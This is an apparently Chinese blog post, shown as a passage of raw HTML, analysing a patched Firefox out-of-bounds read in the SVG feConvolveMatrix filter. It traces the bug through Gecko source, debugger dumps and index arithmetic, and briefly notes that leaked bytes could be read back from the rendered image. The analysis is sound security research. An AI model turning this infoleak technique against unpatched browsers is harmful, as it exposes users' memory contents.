class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FilterPrimitiveDescription</span><br><span class="line">SVGFEConvolveMatrixElement::GetPrimitiveDescription(nsSVGFilterInstance* aInstance,</span><br><span class="line">                                                    <span class="hljs-keyword">const</span> IntRect&amp; aFilterSubregion,</span><br><span class="line">                                                    <span class="hljs-keyword">const</span> nsTArray&lt;<span class="hljs-keyword">bool</span>&gt;&amp; aInputsAreTainted,</span><br><span class="line">                                                    nsTArray&lt;RefPtr&lt;SourceSurface&gt;&gt;&amp; aInputImages)</span><br><span class="line">{</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">  Size kernelUnitLength =</span><br><span class="line">    GetKernelUnitLength(aInstance, &amp;mNumberPairAttributes[KERNEL_UNIT_LENGTH]);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// &#x8865;&#x4E01;&#x4F4D;&#x7F6E;</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (kernelUnitLength.width &lt;= <span class="hljs-number">0</span> || kernelUnitLength.height &lt;= <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-comment">// According to spec, A negative or zero value is an error. See link below for details.</span></span><br><span class="line">    <span class="hljs-comment">// https://www.w3.org/TR/SVG/filters.html#feConvolveMatrixElementKernelUnitLengthAttribute</span></span><br><span class="line">    <span class="hljs-keyword">return</span> failureDescription;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// &#x5C06;&#x5143;&#x7D20;&#x7684;&#x5404;&#x4E2A;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x503C;&#x5B58;&#x50A8;&#x8D77;&#x6765;</span></span><br><span class="line">  <span class="hljs-function">FilterPrimitiveDescription <span class="hljs-title">descr</span><span class="hljs-params">(PrimitiveType::ConvolveMatrix)</span></span>;</span><br><span class="line">  AttributeMap&amp; atts = descr.Attributes();</span><br><span class="line">  atts.Set(eConvolveMatrixKernelSize, IntSize(orderX, orderY));</span><br><span class="line">  atts.Set(eConvolveMatrixKernelMatrix, &amp;kernelMatrix[<span class="hljs-number">0</span>], kmLength);</span><br><span class="line">  atts.Set(eConvolveMatrixDivisor, divisor);</span><br><span class="line">  atts.Set(eConvolveMatrixBias, bias);</span><br><span class="line">  atts.Set(eConvolveMatrixTarget, IntPoint(targetX, targetY));</span><br><span class="line">  atts.Set(eConvolveMatrixEdgeMode, edgeMode);</span><br><span class="line">  atts.Set(eConvolveMatrixKernelUnitLength, kernelUnitLength);  <span class="hljs-comment">// eConvolveMatrixKernelUnitLength = 0x18</span></span><br><span class="line">  atts.Set(eConvolveMatrixPreserveAlpha, preserveAlpha);</span><br></pre></td></tr></tbody></table></figure><br>&#x8FD9;&#x91CC;&#x7684;&#x5C5E;&#x6027;&#x5219;&#x662F;<code>kernelUnitLength</code>&#xFF0C;&#x83B7;&#x53D6;&#x5176;&#x503C;&#x4E4B;&#x540E;&#xFF0C;&#x5E76;&#x5B58;&#x50A8;&#x5230;<code>AttributeMap</code>&#x4E2D;&#xFF0C;&#x5BF9;&#x5E94;&#x5C5E;&#x6027;&#x548C;&#x5C5E;&#x6027;&#x503C;&#x5BF9;&#xFF0C;&#x800C;&#x8865;&#x4E01;&#x5904;&#x5219;&#x5BF9;&#x8BE5;&#x503C;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#x6B63;&#x6570;&#x5224;&#x65AD;&#x3002;<p></p><p>&#x8C03;&#x8BD5;&#x8FDB;&#x5165;&#x540E;&#x503C;&#x7684;&#x60C5;&#x51B5;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xul!mozilla::dom::SVGFEConvolveMatrixElement::GetPrimitiveDescription+0x209:</span><br><span class="line">63c105f1 e8b5870100      call    xul!nsSVGFE::GetKernelUnitLength (63c28dab)</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=002cc908 ebx=00000003 ecx=002cc89c edx=00000009 esi=0ed76d30 edi=14cb6a00</span><br><span class="line">eip=63c105f6 esp=002cc8d0 ebp=002cc9b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246</span><br><span class="line">xul!mozilla::dom::SVGFEConvolveMatrixElement::GetPrimitiveDescription+0x20e:</span><br><span class="line">63c105f6 6a07            push    7</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">002cc908  3f800000 bf800000 00000000 64e476d4</span><br><span class="line">002cc918  c1f0001d 0000000c 00000000 00000000</span><br><span class="line">002cc928  00000000 00000000 64ea41bc 00000000</span><br><span class="line">002cc938  00000000 00000000 00000000 00000000</span><br><span class="line">002cc948  00000000 00000000 00000000 64ea41bc</span><br><span class="line">002cc958  00000000 002cc900 64ea41bc 00000000</span><br><span class="line">002cc968  0fcb2ec0 6294dc7a 00000010 002cc9dc</span><br><span class="line">002cc978  00000000 002cc9a0 00000008 62b60e5e</span><br></pre></td></tr></tbody></table></figure><br><code>3f800000</code> = <code>1.0</code>, <code>bf800000</code> = <code>-1.0</code><p></p><p>&#x5B58;&#x50A8;&#x4E4B;&#x540E;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5C06;&#x7EE7;&#x7EED;&#x5904;&#x7406;&#xFF0C;&#x5C06;&#x8FDB;&#x5165;&#x6E32;&#x67D3;&#x8FC7;&#x7A0B;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x56FE;&#x50CF;&#x7684;&#x5904;&#x7406;&#x5C06;&#x4F1A;&#x8FDB;&#x884C;&#x5377;&#x79EF;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x5177;&#x4F53;&#x6CA1;&#x67E5;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x67E5;&#x770B;&#xFF0C;&#x4E5F;&#x662F;&#x56FE;&#x50CF;&#x5904;&#x7406;&#x7684;&#x57FA;&#x7840;&#x7B97;&#x6CD5;&#x4E4B;&#x4E00;&#x3002;<br>&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x5904;&#x7406;&#x5219;&#x662F;&#x5728;<code>ConvolvePixel</code>&#x51FD;&#x6570;&#x4E2D;&#x4F53;&#x73B0;&#x3002;</p><h2 id="ConvolvePixel"><a href="#ConvolvePixel" class="headerlink" title="ConvolvePixel"></a>ConvolvePixel</h2><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> CoordType&gt;</span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="line">ConvolvePixel(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span> *aSourceData,</span><br><span class="line">              <span class="hljs-keyword">uint8_t</span> *aTargetData,</span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aWidth, <span class="hljs-keyword">int32_t</span> aHeight,</span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aSourceStride, <span class="hljs-keyword">int32_t</span> aTargetStride, <span class="hljs-comment">// aSourceStride=4d0</span></span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aX, <span class="hljs-keyword">int32_t</span> aY, <span class="hljs-comment">// 0x12d, 0x83</span></span><br><span class="line">              <span class="hljs-keyword">const</span> <span class="hljs-keyword">int32_t</span> *aKernel,</span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aBias, <span class="hljs-keyword">int32_t</span> shiftL, <span class="hljs-keyword">int32_t</span> shiftR,</span><br><span class="line">              <span class="hljs-keyword">bool</span> aPreserveAlpha,</span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aOrderX, <span class="hljs-keyword">int32_t</span> aOrderY,   <span class="hljs-comment">// 3, 3</span></span><br><span class="line">              <span class="hljs-keyword">int32_t</span> aTargetX, <span class="hljs-keyword">int32_t</span> aTargetY, <span class="hljs-comment">// 1, 1</span></span><br><span class="line">              CoordType aKernelUnitLengthX,  <span class="hljs-comment">//  1</span></span><br><span class="line">              CoordType aKernelUnitLengthY)  <span class="hljs-comment">// -1</span></span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int32_t</span> sum[<span class="hljs-number">4</span>] = {<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>};</span><br><span class="line">  <span class="hljs-keyword">int32_t</span> offsets[<span class="hljs-number">4</span>] = { B8G8R8A8_COMPONENT_BYTEOFFSET_R,   <span class="hljs-comment">// 2</span></span><br><span class="line">                         B8G8R8A8_COMPONENT_BYTEOFFSET_G,   <span class="hljs-comment">// 1</span></span><br><span class="line">                         B8G8R8A8_COMPONENT_BYTEOFFSET_B,   <span class="hljs-comment">// 0</span></span><br><span class="line">                         B8G8R8A8_COMPONENT_BYTEOFFSET_A }; <span class="hljs-comment">// 3</span></span><br><span class="line">  <span class="hljs-keyword">int32_t</span> channels = aPreserveAlpha ? <span class="hljs-number">3</span> : <span class="hljs-number">4</span>;</span><br><span class="line">  <span class="hljs-keyword">int32_t</span> roundingAddition = shiftL == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span> &lt;&lt; (shiftL - <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> y = <span class="hljs-number">0</span>; y &lt; aOrderY; y++) {</span><br><span class="line">    CoordType sampleY = aY + (y - aTargetY) * aKernelUnitLengthY;   <span class="hljs-comment">// -1</span></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> x = <span class="hljs-number">0</span>; x &lt; aOrderX; x++) {</span><br><span class="line">      CoordType sampleX = aX + (x - aTargetX) * aKernelUnitLengthX;  <span class="hljs-comment">// 1</span></span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> i = <span class="hljs-number">0</span>; i &lt; channels; i++) {</span><br><span class="line">        sum[i] += aKernel[aOrderX * y + x] *</span><br><span class="line">          ColorComponentAtPoint(aSourceData, aSourceStride, <span class="hljs-comment">// 4d0</span></span><br><span class="line">                                sampleX, sampleY, <span class="hljs-number">4</span>, offsets[i]);   <span class="hljs-comment">// sampleY * aSourceStride + sampleX * 4 + offsets[i]</span></span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  ......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">uint8_t</span></span><br><span class="line">ColorComponentAtPoint(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span> *aData, <span class="hljs-keyword">int32_t</span> aStride, <span class="hljs-keyword">int32_t</span> x, <span class="hljs-keyword">int32_t</span> y, <span class="hljs-keyword">size_t</span> bpp, <span class="hljs-keyword">ptrdiff_t</span> c)</span><br><span class="line">{</span><br><span class="line">  DebugOnlyCheckColorSamplingAccess(&amp;aData[y * aStride + bpp * x + c]);</span><br><span class="line">  <span class="hljs-keyword">return</span> aData[y * aStride + bpp * x + c];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5C31;&#x662F; <code>aSourceData</code> &#x7684;&#x8BBF;&#x95EE;&#x8D8A;&#x754C;&#x3002;<br>crash<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=00027ffa ebx=00000004 ecx=00027b40 edx=000004b8 esi=00000000 edi=18e5e008</span><br><span class="line">eip=634edb06 esp=0030cf98 ebp=00000004 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206</span><br><span class="line">xul!mozilla::gfx::ConvolvePixel&lt;int&gt;+0x130:</span><br><span class="line">634edb06 0fb60438        movzx   eax,byte ptr [eax+edi]     ds:0023:18e86002=??</span><br></pre></td></tr></tbody></table></figure><br>&#x5BF9;&#x5E94;&#x9644;&#x8FD1;&#x7684;&#x6C47;&#x7F16;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">634edb02 03c1            add     eax,ecx</span><br><span class="line">634edb04 03c2            add     eax,edx</span><br><span class="line">634edb06 0fb60438        movzx   eax,byte ptr [eax+edi]     ds:0023:0d41a4d5=00</span><br><span class="line">634edb0a 0faf442440      imul    eax,dword ptr [esp+40h]</span><br><span class="line">634edb0f 0144b444        add     dword ptr [esp+esi*4+44h],eax</span><br><span class="line">634edb13 46              inc     esi</span><br><span class="line">634edb14 3bf3            cmp     esi,ebx</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>esp = 0030cf98</code> &#x7ECF;&#x8FC7;&#x8C03;&#x8BD5;&#x5F97;&#x77E5;&#xFF0C;&#x548C;&#x5F00;&#x59CB;&#x8FDB;&#x53BB;&#x51FD;&#x6570;&#x65F6;&#x7684;<code>esp</code>&#x504F;&#x79FB;&#x4E3A;0x68<br>&#x56E0;&#x6B64;&#x5BF9;&#x5E94;&#x503C;&#x4E3A;&#xFF1A;<code>esp+0x68</code><br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 30d000</span><br><span class="line">0030d000  634ef748 0000012e 0000012e 000004d0</span><br><span class="line">0030d010  000004c0 0000012d 00000083 0ed071c0</span><br><span class="line">0030d020  00000000 00000016 00000000 00000000</span><br><span class="line">0030d030  00000003 00000003 00000001 00000001</span><br><span class="line">0030d040  00000001 ffffffff 1652d5a0 1652d560</span><br><span class="line">0030d050  0030d108 1652d560 00000000 00000016</span><br><span class="line">0030d060  0ed07310 0ed07334 0ed07334 0ed071c0</span><br><span class="line">0030d070  0ed05040 00000000 00000000 41500000</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x6B64;&#x5BF9;<code>aSourceData</code> &#x6570;&#x7EC4;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4EA7;&#x751F;&#x5F02;&#x5E38;&#x65F6;&#x7D22;&#x5F15;&#x503C;&#x4E3A;&#xFF1A;<br><code>(0x83 + (0-1) * (-1))*0x4d0 + ((0x12d + (2-1) * 1))*4 + 2 = 0x00027ffa</code><br>&#x5BFC;&#x81F4;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x3002;<p></p><p>&#x56DE;&#x5230; <code>ConvolvePixel</code> &#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528; <code>FilterNodeConvolveMatrixSoftware::DoRender</code> &#x4EE5;&#x53CA;&#x4EE5;&#x4E0A;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E3B;&#x8981;&#x786E;&#x5B9A;<code>aSourceData</code> &#x6570;&#x7EC4;&#x7684;&#x6765;&#x6E90;&#x548C;&#x6240;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;&#x3002;</p><h2 id="DoRender"><a href="#DoRender" class="headerlink" title="DoRender"></a>DoRender</h2><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> y = <span class="hljs-number">0</span>; y &lt; aRect.Height(); y++) {</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> x = <span class="hljs-number">0</span>; x &lt; aRect.Width(); x++) {</span><br><span class="line">      ConvolvePixel(sourceData, targetData,</span><br><span class="line">                    aRect.Width(), aRect.Height(), sourceStride, targetStride,</span><br><span class="line">                    x, y, intKernel, bias, shiftL, shiftR, mPreserveAlpha,</span><br><span class="line">                    mKernelSize.<span class="hljs-built_in">width</span>, mKernelSize.<span class="hljs-built_in">height</span>, mTarget.x, mTarget.y,</span><br><span class="line">                    aKernelUnitLengthX, aKernelUnitLengthY);  <span class="hljs-comment">// &#x5377;&#x79EF;&#x8BA1;&#x7B97; mKernelSize &#x731C;&#x6D4B;&#x662F; kernelMatrix &#x5C5E;&#x6027;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x662F;&#x6700;&#x540E;&#x5FAA;&#x73AF;&#x7684;&#x4E00;&#x4E2A;&#x5377;&#x79EF;&#x8BA1;&#x7B97;&#xFF0C;&#x4F20;&#x5165;&#x7684;<code>sourceData</code> &#x5219;&#x5BF9;&#x5E94;&#x540E;&#x9762;&#x8C03;&#x7528;&#x7684; <code>aSourceData</code>&#x3002;</p><p>&#x8FC7;&#x6EE4;&#x6389;&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x6790;&#x540E;&#x5F97;&#x5230; <code>aSourceData</code> &#x7684;&#x521B;&#x5EFA;&#x8FC7;&#x7A0B;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">RefPtr&lt;DataSourceSurface&gt; input =</span><br><span class="line">    GetInputDataSourceSurface(IN_CONVOLVE_MATRIX_IN, srcRect, NEED_COLOR_CHANNELS, mEdgeMode, &amp;mSourceRect);</span><br><span class="line">......</span><br><span class="line"><span class="hljs-function">DataSourceSurface::ScopedMap <span class="hljs-title">sourceMap</span><span class="hljs-params">(input, DataSourceSurface::READ)</span></span>;  <span class="hljs-comment">// &#x6784;&#x5EFA;source map</span></span><br><span class="line">......</span><br><span class="line"><span class="hljs-keyword">uint8_t</span>* sourceData = DataAtOffset(input, sourceMap.GetMappedSurface(), offset);</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x6B64;<code>sourceData</code> &#x662F;&#x901A;&#x8FC7; <code>GetInputDataSourceSurface</code> &#x6765;&#x521B;&#x5EFA;&#xFF0C;&#x5927;&#x5C0F;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x4F9D;&#x8D56;&#x4E8E;&#x8F93;&#x5165;&#x7684;&#x6837;&#x672C;&#xFF0C;&#x5177;&#x4F53;&#x8BA1;&#x7B97;&#x6D41;&#x7A0B;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x7406;&#x6E05;&#x695A;&#xFF0C;&#x6700;&#x7EC8;&#x4F1A;&#x8C03;&#x7528;<code>SourceSurfaceAlignedRawData::Init</code> &#x6765;&#x8FDB;&#x884C;&#x5B9E;&#x9645;&#x7684;&#x5185;&#x5B58;&#x5206;&#x914D;&#x3002;<p></p><p>gfx/2d/SourceSurfaceRawData.cpp<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">bool</span></span><br><span class="line">SourceSurfaceAlignedRawData::Init(<span class="hljs-keyword">const</span> IntSize &amp;aSize,</span><br><span class="line">                                  SurfaceFormat aFormat,</span><br><span class="line">                                  <span class="hljs-keyword">bool</span> aClearMem,</span><br><span class="line">                                  <span class="hljs-keyword">uint8_t</span> aClearValue,</span><br><span class="line">                                  <span class="hljs-keyword">int32_t</span> aStride)</span><br><span class="line">{</span><br><span class="line">  mFormat = aFormat;</span><br><span class="line">  mStride = aStride ? aStride : GetAlignedStride&lt;<span class="hljs-number">16</span>&gt;(aSize.<span class="hljs-built_in">width</span>, BytesPerPixel(aFormat));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">size_t</span> bufLen = BufferSizeFromStrideAndHeight(mStride, aSize.<span class="hljs-built_in">height</span>);  <span class="hljs-comment">// &#x83B7;&#x53D6;&#x9700;&#x8981;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (bufLen &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-keyword">bool</span> zeroMem = aClearMem &amp;&amp; !aClearValue;</span><br><span class="line">    <span class="hljs-keyword">static_assert</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">decltype</span>(mArray[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span>,</span><br><span class="line">                  <span class="hljs-string">&quot;mArray.Realloc() takes an object count, so its objects must be 1-byte sized if we use bufLen&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// AlignedArray uses cmalloc to zero mem for a fast path.</span></span><br><span class="line">    mArray.Realloc(<span class="hljs-comment">/* actually an object count */</span> bufLen, zeroMem);  <span class="hljs-comment">// &#x5185;&#x5B58;&#x5206;&#x914D;</span></span><br><span class="line">    mSize = aSize;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (mArray &amp;&amp; aClearMem &amp;&amp; aClearValue) {</span><br><span class="line">      <span class="hljs-built_in">memset</span>(mArray, aClearValue, mStride * aSize.<span class="hljs-built_in">height</span>);  </span><br><span class="line">    }</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    mArray.Dealloc();</span><br><span class="line">    mSize.SizeTo(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> mArray != <span class="hljs-literal">nullptr</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x901A;&#x8FC7;&#x5B9E;&#x9645;&#x7684;&#x8C03;&#x8BD5;&#x786E;&#x8BA4;&#x5230;&#x5927;&#x5C0F;&#x4E3A;<code>0x00026ac0</code>&#xFF0C;&#x800C;&#x5C1D;&#x8BD5;&#x8BBF;&#x95EE;&#x7684;&#x4F4D;&#x7F6E;&#x4E3A; <code>0x00027ffa</code>&#xFF0C;&#x56E0;&#x6B64;&#x5BFC;&#x81F4;&#x8D8A;&#x754C;&#x8BFB;&#x3002;<p></p><p>&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709; &#x5BF9;&#x975E;&#x6B63;&#x6570;&#x7684;&#x8003;&#x8651;&#xFF0C;<br>&#x5B9E;&#x9645;&#x8C03;&#x8BD5;&#x4E2D;&#xFF0C;<code>kernelUnitLength</code> &#x7684;&#x503C;&#x5F71;&#x54CD;&#x5185;&#x5B58;&#x7684;&#x5206;&#x914D;&#xFF0C;<br>(1,  1) &#x5206;&#x914D;&#xFF1A; 0x0002bf20<br>(1, -1) &#x5206;&#x914D;&#xFF1A; 0x00026ac0</p><p>&#x4E3A;-1&#x65F6;&#xFF0C;&#x5206;&#x914D;&#x7684;&#x7A7A;&#x95F4;&#x504F;&#x5C0F;&#xFF0C;&#x4F46;&#x662F;&#x4ECD;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x6570;&#x7EC4;&#x8303;&#x56F4;&#x5916;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum[i] += aKernel[aOrderX * y + x] *</span><br><span class="line">          ColorComponentAtPoint(aSourceData, aSourceStride, <span class="hljs-comment">// </span></span><br><span class="line">                                sampleX, sampleY, <span class="hljs-number">4</span>, offsets[i]);   <span class="hljs-comment">//</span></span><br></pre></td></tr></tbody></table></figure><br>&#x8D8A;&#x754C;&#x8BFB;&#x5165;&#x7684;&#x503C;&#xFF0C;&#x6700;&#x7EC8;&#x4F1A;&#x5728;<code>sum</code>&#x4E2D;&#x4F53;&#x73B0;&#xFF0C;&#x5377;&#x79EF;&#x8BA1;&#x7B97;&#x7684;&#x7ED3;&#x679C;&#x6700;&#x540E;&#x4E5F;&#x5C06;&#x53CD;&#x5E94;&#x5230;SVG&#x56FE;&#x50CF;&#x4E2D;&#xFF0C;&#x5F53;&#x5BF9;&#x6574;&#x4E2A;&#x5904;&#x7406;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x719F;&#x6089;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4ECE;&#x7ED8;&#x5236;&#x7684;SVG&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x8D8A;&#x754C;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x3002;<p></p><h2 id="debug-help"><a href="#debug-help" class="headerlink" title="debug help"></a>debug help</h2><p>enum AttributeName {<br>  eBlendBlendmode = 0,<br>  eMorphologyRadii,<br>  eMorphologyOperator,<br>  eColorMatrixType,<br>  &#x2026;.<br>  eConvolveMatrixKernelUnitLength,<br> }<br>&#x6392;&#x5E8F;&#x81F3;24 &#x503C;&#x4E3A;24 &#x6216;&#x8005;&#x662F;&#x56E0;&#x4E3A;&#x6392;&#x5E8F;24<br><a href="https://github.com/mozilla/gecko-dev/blob/ea2bfe23e255fc3d345647d2c753425e7f4de515/gfx/src/FilterSupport.h" target="_blank" rel="noopener">link</a></p><p><code>&#x5185;&#x5B58;&#x5206;&#x914D;</code><br>0x4b0 * 0x96 (1, 1)</p><p>0x4b0 * 0x84 (1, -1)</p><p>(10, -10)<br>0x500 * 0x500</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.w3.org/TR/SVG/filters.html#feConvolveMatrixElementKernelUnitLengthAttribute" target="_blank" rel="noopener">KernelUnitLength</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1185&amp;can=1&amp;q=svg" target="_blank" rel="noopener">Project Zero</a></li><li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1347617" target="_blank" rel="noopener">bugzilla</a></li><li><a href="https://github.com/mozilla/gecko-dev/commit/44a355f273310e54df6c8336059e46085cb75834" target="_blank" 